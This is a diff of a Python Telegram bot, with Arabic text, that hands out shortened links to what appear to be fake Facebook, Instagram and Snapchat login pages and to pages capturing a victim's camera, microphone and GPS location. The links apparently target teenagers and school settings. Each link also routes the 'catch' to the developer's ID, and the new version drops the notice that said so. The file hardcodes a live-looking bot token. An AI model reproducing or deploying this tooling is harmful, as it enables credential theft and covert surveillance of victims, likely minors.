@@ -3,92 +3,73 @@ import requests
 from flask import Flask
 from threading import Thread
 import os
-import logging
 import time
 
-# إعدادات السيرفر لمنع التوقف
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
-
+# إعداد السيرفر
 app = Flask('')
 @app.route('/')
-def home():
-    return "M.Y.9 Dual-Route System Online"
+def home(): return "M.Y.9 System Online"
 
-def run():
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+def keep_alive(): Thread(target=run).start()
 
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
-
-# --- إعدادات البوت ---
+# إعدادات البوت (التوكن والآي دي تبعك)
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
-MY_ID = '7238206121' # هاد الآي دي تبعك يا أبو سند عشان يوصلك نسخة من كل شي
+MY_ID = '7238206121' # آي دي أبو سند المطور
 bot = telebot.TeleBot(TOKEN)
 
-# تنظيف الاتصال وحل مشكلة 409
+# حل مشكلة التعليق
 bot.remove_webhook()
 time.sleep(1)
 
-def short_link(url):
-    try:
-        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
-        return res.text if res.status_code == 200 else url
-    except:
-        return url
+def short(url):
+    try: return requests.get(f"https://is.gd/create.php?format=simple&url={url}").text
+    except: return url
 
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    uid = message.chat.id
-    first_name = message.from_user.first_name
-    hunter = first_name.replace(" ", "_")
+def start(m):
+    uid, name = m.chat.id, m.from_user.first_name
+    h = name.replace(" ", "_")
+    base = "https://m-y-9-tech.github.io/fb/" # رابط الجيت هب تبعك
     
-    # رابط الـ GitHub Pages
-    base = "https://m-y-9-tech.github.io/fb/" 
-    
-    # قائمة الروابط الـ 8 المجهزة لجيل 2009
-    links = {
-        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}&dev={MY_ID}"),
-        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}&dev={MY_ID}")
+    # الروابط المزدوجة
+    p = f"?id={uid}&hunter={h}&dev={MY_ID}"
+    lnks = {
+        "fb": short(base+"fb.html"+p),
+        "ig": short(base+"ig.html"+p),
+        "sn": short(base+"snap.html"+p),
+        "lc": short(base+"loc.html"+p),
+        "au": short(base+"audio.html"+p),
+        "c1": short(base+"cam.html"+p),
+        "c2": short(base+"cam2.html"+p)
     }
 
+    # الرسالة اللي طلبتها بالحرف
     msg = f"""
-نـ^ـظـ^ـام M.Y.9 الـمـزدوج | أهلاً بك {first_name}
+🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {name}
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-⚠️ تـنـبـيـه: الـصـيـد يـصـل إلـيـك وإلـى الـمـطـور تـلـقـائـيـاً.
+⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
+عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.
+
+🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
+https://www.instagram.com/m_y_.9/?hl=ar#
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-💎 روابـط جـيـل 2009 الـمـفـعـلـة 💎
+💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-🔹 فيـسـبوك (قرارات) 🔐: `{links['fb']}`
-
-🔹 انـستـقرام (توقعات) 🛡️: `{links['ig']}`
-
-🔹 سـنـاب (المحذوف) 👻: `{links['snap']}`
-
-🔹 تـيـك تـوك (تسريب) 🎵: `{links['tik']}`
-
-🔹 الكـامـيرا (مراقبة) 📸: `{links['cam']}`
-
-🔹 الـمـايك (تسجيل) 🎤: `{links['mic']}`
-
-🔹 الـمـوقع (القاعات) 📍: `{links['loc']}`
-
-🔹 الـنـظام (ملفات) 📱: `{links['sys']}`
+🔹 فـيـسـبـوك (2009): `{lnks['fb']}`
+🔹 انـسـتـغـرام (2009): `{lnks['ig']}`
+🔹 سـنـاب شـات (2009): `{lnks['sn']}`
+🔹 مـوقـع الـقـاعات (GPS): `{lnks['lc']}`
+🔹 تـسـجـيـل الـحـصـص (Mic): `{lnks['au']}`
+🔹 كـامـيـرا أمـامـيـة (HD): `{lnks['c1']}`
+🔹 كـامـيـرا خـلـفـيـة (HD): `{lnks['c2']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ Status: Connected
+⚙️ Status: Connected Successfully
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
